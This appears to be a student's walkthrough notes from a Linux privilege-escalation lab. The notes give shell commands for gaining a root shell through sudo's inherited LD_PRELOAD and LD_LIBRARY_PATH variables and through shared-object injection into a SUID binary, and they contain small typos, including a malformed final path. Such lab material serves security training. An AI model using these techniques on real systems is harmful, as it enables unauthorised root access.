# Linux Priv Esc

### Task 7

Sudo can be configured to inherit certain variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):

sudo -l

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first. 

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

Run one of the programs you are allowed to run via sudo, while setting the LD_PRELOAD environment variable to the full path of the new shared object:

sudo LD_PRELOAD=/tmp/preload.so program-name-here

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chise, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

ldd /usr/sbin/apache2

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

sudo LD_LIBRARY_PATH=/tmp apache2

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. 

### Task 12 - SUID /SGID Executables - Shared Object Injection

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

/usr/local/bin/suid-so

Run strace on the file and search the output for open / access calls and for "no such file” errors:

strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file”

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the [libcalc.so](http://libcalc.so) file:

mkdir /home/user/.config

Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

/usr/local.bin.suid-so